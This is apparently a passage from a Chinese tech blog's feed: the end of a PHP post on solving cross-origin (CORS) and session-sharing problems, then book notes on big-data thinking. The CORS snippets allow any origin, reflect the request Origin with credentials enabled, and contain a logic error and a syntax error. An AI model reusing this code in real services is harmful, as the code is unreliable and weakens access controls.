&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org3059b0c&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org3059b0c&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.2&lt;/span&gt; Server&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-2&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 2: &lt;/span&gt;粗糙解决方式&lt;/label&gt;&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;// &amp;#20801;&amp;#35768;&amp;#25152;&amp;#26377;&amp;#36328;&amp;#22495;&amp;#35831;&amp;#27714;
header('Access-Control-Allow-Origin: *')&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;

// &amp;#21482;&amp;#20801;&amp;#35768; http://www.baidu.com &amp;#21457;&amp;#26469;&amp;#30340;&amp;#36328;&amp;#22495;&amp;#35831;&amp;#27714;
// header('Access-Control-Allow-Origin: http://www.baidu.com')&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;

// &amp;#35774;&amp;#32622;&amp;#25903;&amp;#25345;&amp;#30340; http &amp;#35831;&amp;#27714;&amp;#26041;&amp;#24335;
header('Access-Control-Allow-Methods:POST,GET,OPTIONS,PUT,DELETE')&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;

// &amp;#20801;&amp;#35768;&amp;#30340;&amp;#21709;&amp;#24212;&amp;#22836;&amp;#23383;&amp;#27573;&amp;#65292;&amp;#35831;&amp;#25353;&amp;#29031;&amp;#33258;&amp;#24049;&amp;#38656;&amp;#27714;&amp;#28155;&amp;#21152;
header('Access-Control-Allow-Headers:access_token')&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 3: &lt;/span&gt;动态判断处理跨域问题&lt;/label&gt;&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;if(isset($_SERVER['HTTP_ORIGIN'])){
        // &amp;#35831;&amp;#27714;&amp;#26041;&amp;#27861;
        $request_method = $_SERVER['REQUEST_METHOD']&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
        // &amp;#23450;&amp;#20041;&amp;#19968;&amp;#20010;&amp;#20801;&amp;#35768;&amp;#36328;&amp;#22495;&amp;#35831;&amp;#27714;&amp;#25509;&amp;#21475;&amp;#30340;&amp;#22495;&amp;#21517;&amp;#21015;&amp;#34920;&amp;#65292;&amp;#36825;&amp;#37324;&amp;#20320;&amp;#21487;&amp;#20197;&amp;#29992;&amp;#37197;&amp;#32622;&amp;#20063;&amp;#21487;&amp;#20197;&amp;#29992;&amp;#20854;&amp;#23427;&amp;#24418;&amp;#24335;&amp;#65292;&amp;#25105;&amp;#36825;&amp;#37324;&amp;#21482;&amp;#26159;&amp;#29992;$GLOBALS&amp;#31616;&amp;#21333;&amp;#28436;&amp;#31034;&amp;#19968;&amp;#19979;
        $allow_origin = array(
        'baidu.com',
        'bing.com'
        )&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
        // &amp;#21028;&amp;#26029;&amp;#26159;&amp;#21542;&amp;#26377;origin&amp;#35831;&amp;#27714;&amp;#22836;
        if(in_array($request_method, $allow_origin)
        {
                header('Access-Control-Allow-Origin: ' . $_SERVER['HTTP_ORIGIN'])&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
                header('Access-Control-Allow-Credentials: true')&lt;span style=&quot;color: #b22222;&quot;&gt;; &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;// &amp;#23458;&amp;#25143;&amp;#31471;&amp;#25658;&amp;#24102;&amp;#35777;&amp;#20070;&amp;#24335;&amp;#35775;&amp;#38382;&amp;#12290;&amp;#20986;&amp;#20110;&amp;#23433;&amp;#20840;&amp;#32771;&amp;#34385;&amp;#65292;&amp;#35813;&amp;#39033;&amp;#35774;&amp;#32622;&amp;#20026;true&amp;#26102;&amp;#65292;Access-Control-Allow-Origin &amp;#30340;&amp;#20540;&amp;#19981;&amp;#20801;&amp;#35768;&amp;#20026;&amp;#12300;*&amp;#12301;&lt;/span&gt;
                header('Access-Control-Allow-Methods:POST,GET,OPTIONS,PUT,DELETE')&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
                header('Access-Control-Allow-Headers:x-requested-with,content-type,access_token')&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
        }
    }
}
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org8eb5600&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org8eb5600&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;3&lt;/span&gt; Session 跨域问题解决&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-3&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;ini_set('session.cookie_domain', '.a.com')&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
header('Access-Control-Allow-Credentials: true')&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9d7e523&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org9d7e523&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.1&lt;/span&gt; 参考资料&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-1&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/z69183787/article/details/78954325&quot;&gt;跨域Ajax请求时是否带Cookie的设置&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="PHP-跨域问题" /><summary type="html">感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！</summary></entry><entry><title type="html">《致胜大数据时代的50种思维方法》</title><link href="http://localhost:4000/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2018/09/02/big-data/" rel="alternate" type="text/html" title="《致胜大数据时代的50种思维方法》" /><published>2018-09-02T00:00:00+08:00</published><updated>2018-09-02T00:00:00+08:00</updated><id>http://localhost:4000/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2018/09/02/big-data</id><content type="html" xml:base="http://localhost:4000/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/2018/09/02/big-data/">&lt;p&gt;
致胜大数据时代的50种思维方法
&lt;/p&gt;

&lt;div class=&quot;org-center&quot;&gt;
&lt;p&gt;
If you have questions, please send email to zrg1390556487@gmail.com.
&lt;/p&gt;
&lt;/div&gt;

&lt;div id=&quot;outline-container-orgd786c0d&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgd786c0d&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 前言&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgc2b4bf1&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgc2b4bf1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; 什么是大数据&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;最早提出“大数据”时代来临的是全球知名的咨询公司麦肯锡。“数据已经渗透到每一个行业和业务领域，成为重要的组成部分之一。人们对于海量数据的挖掘和运用，预示着新一波生产率增长和消费者盈余浪潮的到来。”&lt;/li&gt;
&lt;li&gt;2008年9月，《自然》杂志推出了封面专栏——“大数据”，内容讲述了数据在生物、物理、工程、数学及社会经济等多方面学科所占据的位置和角色的重要性。&lt;/li&gt;
&lt;li&gt;哈佛大学-社会学教授-加里·金说：“这是一场革命，庞大的数据资源使得各个领域开始了量化进程。无论学术界、商界还是政府，所有领域都将开始这种进程。”&lt;/li&gt;
&lt;li&gt;“大数据”，英文为&quot;Big Dat，，&quot;简单来说，“大数据”是一种巨量资料库，可以在合理时间内达到撷取、管理、处理并整理为帮助公司、企业经营和决策的资讯信息。&lt;/li&gt;
&lt;li&gt;业界将“大数据”概括成四个V，即大量化(Volume)、多样化(Variety)、快速化(Velocity)和价值化(Value)。&lt;/li&gt;
&lt;li&gt;大数据的信息量有多大？
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;截止到2012年，数据量已经从TB级别跃升到PB、EB乃至ZB级别。（1024GB=1TB，1024TB=1PB，102**B=1EB，1024EB=1ZB）。&lt;/li&gt;
&lt;li&gt;2008年，全球产生的数据量为0.49ZB；2009年的数据量为0.8ZB；2010年的数据量为1.2ZB；2011年的数据量更是持续增长，竟高达1.82ZB。这个数据量，相当于全世界的每个人产生200GB以上的数据。&lt;/li&gt;
&lt;li&gt;IBM公司称，截止到2013年10月，全世界所获得的数据中，有90%都是过去两年内产生的。预计到2020年时，全世界所产生的数据规模将达到今天的44倍。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;“大数据”不仅是量大而已，它还具有多样化、快速化、价值化等优势。&lt;/li&gt;
&lt;li&gt;截止到2012年10月，大数据所形成的市场规模在51亿美元左右。到了2017年，此数据预计会上涨到530亿美元。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org73148b8&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org73148b8&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.2&lt;/span&gt; 改变思维模式，用数据说话&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;来举一个简单的例子：苹果公司创始人史蒂夫·乔布斯在罹患癌症后，不惜花费巨额抽取了全身的DNA信息。这样一来，医生就可以根据他全身的DNA信息来判断癌细胞的变化，从而对症下药。然而，对于普通的患者来说，是拿不出巨额钱款来做这种抽取检测的。换句话说，医生只能从普通患者身上提取很小的一部分DNA信息。两者的治疗效果有多大差异，可想而知。&lt;/li&gt;
&lt;li&gt;再来举个简单的例子：如果你上淘宝，登录支付宝账户，点开电子对账单，你是不是能够看到自己一年的消费曲线图？是不是能够看到每个月的支出和收入？是不是能够看到自己的钱花到哪里去了？是不是比拿笔记账清晰和准确得多？根据网络购物的数据中，你还会发现：哪个城市的男人比女人购买的东西还要多；哪个城市的人用支付宝缴纳水电费的频率最高；什么星座的男性或女性在某年的消费额最高；在一年里，在父母或亲友身上花费了多少；节假日时，什么东西最畅销……&lt;/li&gt;
&lt;li&gt;大数据专家维克托·迈尔-舍恩伯格在《大数据时代》中是这样解释的：云计算在获取海量数据的同时，也带来了数据的混杂性，这会给传统的数据分析带来一些困扰。在以往，我们习惯于由数据得出具体结果。而在大数据时代，我们应当关注的是数据之间的相关关系，而不是数据之间的因果关系。&lt;/li&gt;
&lt;li&gt;数据之间的相关关系可以帮助我们捕捉现在的线索和预测未来。如A和B的情况经常一起发生，那么只要注意到B情况发生，就能预测A的情况是怎么样的。这种“A和B”的关系在零售行业和IT行业中已被广泛运用。7-11便利店通过分析零售终端的数据，得出了这样的一个相关关系—温度低于15摄氏度，暖宝宝的销售量便增加5%。于是，只要温度低于这一度数，7-11便利店内的暖宝宝就会上架；豆瓣电台会推荐一些你可能会喜欢的音乐；当你在当当网买某本书后，系统就会提醒你—购买这本书的人中，有30%也购买了另外一本书……&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org84b6855&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org84b6855&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; 大数据是一场革命&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgce881e6&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgce881e6&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.1&lt;/span&gt; 定律思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;此前，在大数据中，有两个较为突出的定律：一秒定律或秒级定律和摩尔定律。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;什么叫一秒定律或秒级定律？指的是对处理速度有要求，一般要在秒级时间给出准确的分析结果。&lt;/li&gt;
&lt;li&gt;什么叫摩尔定律？ 指的是简单地评估出半导体技术进展的经验法则，其重要的意义是对于长期来说的，IC制程技术是以一直线的方式向前推展，使得IC产品能持续降低成本，增加功能和提升性能。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;大数据时代，人们更要重视统计学。为什么要强调统计学呢？那是因为人们在认知能力中，统计思维算是最差劲的。要知道，人的大脑中有一些功能比较优良，甚至超过人们自身的想象，比如人们的语言能力。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;举个例子：当一个人在深夜行走时，会敏锐地察觉到周边的变化。一旦感受到危险或不安的情绪时，就会立即逃跑，甚至大喊大叫。而与此同时，人的大脑之中还有另外一套操作系统，是用来做逻辑推理以及进行统计分析的，只是这个系统不怎么完善。于是，人们天生就缺乏逻辑推理能力和统计思维能力。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;为什么大数据变成了一个最热门的词汇？主要的原因有两个。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一个原因是，由于IT革命后，人们有了处理数据的多方面能力，有对计算机数据的处理能力、对计算机的存储能力以及对计算机的计算的能力，等等。再加上，人类储存信息量的增长速度要比世界经济增长的速度快四倍（这仅仅是在金融危机爆发之前的世界经济增长的速度）。而计算机数据处理能力的增长速度，要比世界经济增长的速度快九倍。&lt;/li&gt;
&lt;li&gt;第二个原因是，社会上的一切现象以及企业的发展，能够被数据化的东西越来越多。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;社科院世界经济与政治研究所副所长何帆总结出了大数据的三个规律：
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一个规律是知其然而不必知其所以然，外行打败内行；&lt;/li&gt;
&lt;li&gt;第二个规律是彻底的价格歧视，商家比你更了解你自己；&lt;/li&gt;
&lt;li&gt;第三个规律是打破专家的信息优势，病人给医生解惑。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9facc18&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org9facc18&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.2&lt;/span&gt; 集合思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;如果把毫不相干或紧密相连的数据组合到一个集合中，就能更有效地处理这些相关的数据。这些数据可以清晰地告诉我们：每一个客户的消费观念、倾向、爱好、需求等，哪些可以归为一类，哪些可以归为另一类。&lt;/li&gt;
&lt;li&gt;大数据的集合是数据数量上的增加，能够实现从量变到质变的过程。&lt;/li&gt;
&lt;li&gt;大数据的基本结构还分为三个层次，反映出观察数据库的不同角度。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一层是物理数据层：是数据库最里面的一层，是物理存贮设备上实际存储的数据的集合。这些数据是最原始数据，也是供用户加工的对象。物理数据层由内部模式描述的指令操作处理的位串、字符和字组合而成。&lt;/li&gt;
&lt;li&gt;第二层是概念数据层：是数据库置于中间的一层，也是数据库的整体逻辑的部分。这层数据层指出了数据与数据之间的逻辑定义和联系，是存贮资料的整合点。此时要注意的是，这层数据层所涉及的是数据库所有对象的逻辑关系，而不是其物理情况。&lt;/li&gt;
&lt;li&gt;第三层是逻辑数据层：是体验用户能够看到和使用的数据库，也是能够证明用户使用过的证明和踪迹。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;总之，小数据，大集合就是按照某种数据集中起来并存放二级存储器中的一种方式。这种数据集合还有着一定的特点，比如尽量不出现重复的情况。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org3d0a7d4&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org3d0a7d4&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.3&lt;/span&gt; 创新思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;首先，大数据的创新思维可以推动并实现巨大的经济效益。&lt;/li&gt;
&lt;li&gt;其次，大数据的创新思维可以增强社会管理水平。&lt;/li&gt;
&lt;li&gt;最后，大数据所具备的创新思维还可以推动和提高安全保障能力。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org4dcedd1&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org4dcedd1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.4&lt;/span&gt; 转型思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-4&quot;&gt;
&lt;p&gt;
以广东省地税系统为例子，从几大方面来揭示大数据推动公共管理从传统向现代转型的趋势。
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一个方面就是：从粗放化向精细化转型。通过建立省级数据应用大集中征管信息系统，广东地税摆脱了以往人工操作的粗放型管理模式，真正实现了税款自动入库、自动划解和实时监控，实现了税款的稳定增长以及快速增长。再通过对海量信息的详细分析和研究，广东省对每一个商家或是企业都实现了精细化转型。比如说，在房地产方面，由于建筑行业的人员流动性大，操作的环节复杂，且没有规范性，就形成了一个比较难管的问题。但自从有了这个征管系统以后，大数据就能够实时获取房地产开发项目明细信息，其中包括土地使用权信息、房产销售进度、销售明细建筑工程进度以及各阶段的税款缴纳情况等，实现了项目从产生到消亡的全过程监控。&lt;/li&gt;
&lt;li&gt;第二个方面就是：从单兵作战型向协作共享型转型。在以往，不同政府部门拥有着不同的信息系统，但很多数据由于相互独立，所以彼此之间没有共享的信息，这些信息单独拿出去，就没有了任何用处。而大数据应用的出现，就扫除了这个盲点，使其实现了数据信息的共享，从而最大限度地发挥了数据的功效。如今，工商、税务等系统每天都会进行信息实时交换，推动了地税机关在办证服务上的创新，从原来的限时办证，实现了目前的即时办证；从原来填写一百多项登记信息，实现了目前只填写八项必要信息内容，甚至实现了享受免填服务。不仅如此，广东省地税借助大数据平台，积极推进第三方涉税信息共享，还明确了二十多个部门共享信息，真正做到了为每个部门提供便利，为社会经济的发展也提供了更快捷、更便利的服务。&lt;/li&gt;
&lt;li&gt;第三个方面就是：从柜台式向自助式全天候转型。根据纳税人的不同类别、涉税业务的不同、办理时段不同等信息，广东地税借助大数据平台，形成了自助式全天候的一种转型。比如，增添了很多服务格局—网上办税、纳税热线、服务大厅、短信服务、自助办税等多种渠道并存的大服务格局。通过自助办税终端系统，为纳税人节时省力，不仅不受地方区域的限制，也可以不受时间的限制，自行完成代开小额发票、打印缴款凭证、清缴税费、申报缴纳车船税等业务。&lt;/li&gt;
&lt;li&gt;第四个方面就是：从被动响应型向主动预见型转型。为了能够更好地服务纳税人，广东省地税通过税收大数据平台，还推出了一项特别的服务，那就是全省集中统一的短信服务。这项服务会为六百多万的纳税人提供短信订阅服务，有针对性地对目标群体提供了多项短信服务，如逾期未申报短信提醒、未到期未申报短信提醒，还有发票开具短信提醒等。借助于大数据平台，广东省地税实现了对受众精确式的短信服务，避免了轰炸式、盲目性的短信服务，从而提升了服务质量。据统计称：截止到2011年，短信服务量超过1800万条；到了2012年，短信服务量已经超过5000万条。&lt;/li&gt;
&lt;li&gt;第五个方面就是：从纸质文书向电子政务转型。现如今，广东省地税互联网电子税务局已基本建成，纳税人只需要短短的五分钟，就能轻松办税，而且还实现了网上缴纳，足不出户。此外，广东省还率先推行网络开具发票，一方面为纳税人提供了方便，节省了时间。一方面使税务机关能在第一时间掌握每张发票的信息，与企业纳税申报数据比对分析，及时总结出没有缴纳、少缴纳的税款情况。这一行动推广以后，还意外地打击了假发票泛滥的情况，也避免了一些人用假发票报销的现象。也因此，这一措施被国家税务总局誉为“税收管理史上的颠覆性举措”。&lt;/li&gt;
&lt;li&gt;第六个方面就是：从风险隐蔽型向风险防范型转型。依托大数据平台，广东省地税建立了惩防体系信息管理系统，对地税干部的税收执法和行政管理实行了全程分析和监控，有效监督和杜绝了一些知法犯法和影响国家荣誉的风险出现。监控预警信息从最初每月收到近7000个，到2012年每月收到不足500个，下降了92%。可以说，自从大数据监控平台出现后，全系统违法违纪发案率大幅度降低，不足5‰，也没有什么重大的违纪案件出现，这就是最大的成功！&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org81920a3&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org81920a3&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.5&lt;/span&gt; 战略思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-5&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;未来，大数据相关的技术和能力将成为一个国家至关重要的核心战略资源。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;2012年3月，美国总统***政府宣布推出一项发展计划——“大数据的研究和发展计划”。&lt;/li&gt;
&lt;li&gt;2013年2月，法国政府发布了一项关于《数字化路线图》的技术措施，列出了五项将会大力支持的战略性高新技术，“大数据”位列其中。在这项措施中，法国政府将以软件制造商、工程师、新兴企业、信息系统设计师等为目标，开展一系列投资计划，旨在通过创新型和科学性的解决方案，将大数据运用到实际生活中。&lt;/li&gt;
&lt;li&gt;2012年9月，日本总务省也发布了一项行动计划，提出“通过大数据和开放数据开创新市场”，以复苏日本为目的推进“活跃在ICT领域的日本”ICT综合战。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;大数据的价值主要体现在三个方面。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一个方面，是能够实现巨大的商业价值。&lt;/li&gt;
&lt;li&gt;第二个方面是能够增强社会管理水平。&lt;/li&gt;
&lt;li&gt;第三个方面是能够提高安全保障能力。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org51069d0&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org51069d0&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;3&lt;/span&gt; 应对传统模式的大数据思维&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-3&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org587bfa9&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org587bfa9&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.1&lt;/span&gt; 扩散思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;为了更好地分析大数据之间的关联性和扩散性，Facebook使用了HBase。HBase是Apache（世界使用排名第一的Web服务器软件）的另外一款产品，使用了独特定义的一组表格。HBase可以像Hadoop（一个分布式系统基础架构，由Apache基金会所开发）一样执行大数据处理产品的能力，以更迅速、更精细的方式来分析数据之间的连接。&lt;/li&gt;
&lt;li&gt;以北京的交通为例子。北京有一个交通智能化分析平台，其数据通过分析源自路网摄像头、传感器、轨道交通、旅游、地面公交、出租车、客运等行业方方面面的数据，得出了这样的一个结果：高速ETC数据每天50万条；4万辆的浮动车每天会产生近2000万条记录；出租车运营为数据为每天100万条；交通卡刷卡的记录为每天1900万条；手机定位数据为每天1800万条……此外，还计算出了北京的人均上班平均用时为52分钟，全国平均人均上班用时39分钟。这些海量的数据，在体量和产生速度上都对存储和处理能力提出了非常高的要求。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org10f5bfa&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org10f5bfa&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.2&lt;/span&gt; 颠覆思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;在大数据时代，创新和转变思维就意味着进步，意味着发展。而传统的、守旧的思维已经不适用于这个时代。因此，转变思维是大数据时代的必然趋势。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;移动说，搞了这么多年，今年才发现，腾讯才是我们的竞争对手。一个小小的微信软件运用，给了电话和短信致命性的一击！&lt;/li&gt;
&lt;li&gt;国内最大的免费安全平台360互联网安全中心能够颠覆传统杀毒软件市场，成为No.1。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;诸多残酷的现实告诉我们：如果还停留在过去，不懂得转变，那只能被大数据时代淘汰！&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgdd1913c&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgdd1913c&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.3&lt;/span&gt; 量变思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-3&quot;&gt;
&lt;p&gt;
信息总量的变化导致了信息形态的变化，也就是量变引发了质变。大数据也一样，量变导致质变。
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;计算机数据处理能力的增长速度非常快，快得令人咂舌。这个速度比世界经济的增长速度还要快九倍；&lt;/li&gt;
&lt;li&gt;人类存储信息量的增长也迅速增长，比世界经济的增长快四倍；&lt;/li&gt;
&lt;li&gt;曾经，欧洲的信息存储量用了50年才增长了一倍，如今每三年就能增长一倍。&lt;/li&gt;
&lt;li&gt;在金融领域，美国股市每天的成交量高达70亿股，Facebook每天更新的照片量超过1000万张，每天，人们会在网站上点击“喜欢”按钮或写评论约30亿次，谷歌公司每天要处理超过24拍字节的数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org4360f28&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org4360f28&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.4&lt;/span&gt; 优劣思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-4&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;事物都是一分为二的，有优势，也有劣势，大数据也是如此。&lt;/li&gt;
&lt;li&gt;大数据的劣势。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;首先，大数据存在隐私泄露的情况。&lt;/li&gt;
&lt;li&gt;其次，大数据只能发现过去，不能左右未来。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org4983c3a&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org4983c3a&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.5&lt;/span&gt; 冲击思维&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-5&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;大数据的冲击力体现在哪些具体方面：
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;第一个方面，大数据正在以无限的增长方式突破有限的增长。&lt;/li&gt;
&lt;li&gt;第二个方面，大数据正在以效益递增突破。&lt;/li&gt;
&lt;li&gt;第三个方面，大数据是和谐共赢的，它突破了对立和矛盾的发展。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;互联网的时代，你需要互联网思维，当然不是那种越来越“玄”的互联网思维，而是一种回归常识的互联网思维。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf77d3f9&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgf77d3f9&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;4&lt;/span&gt; 新数据时代的新思维&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-4&quot;&gt;
&lt;/div&gt;
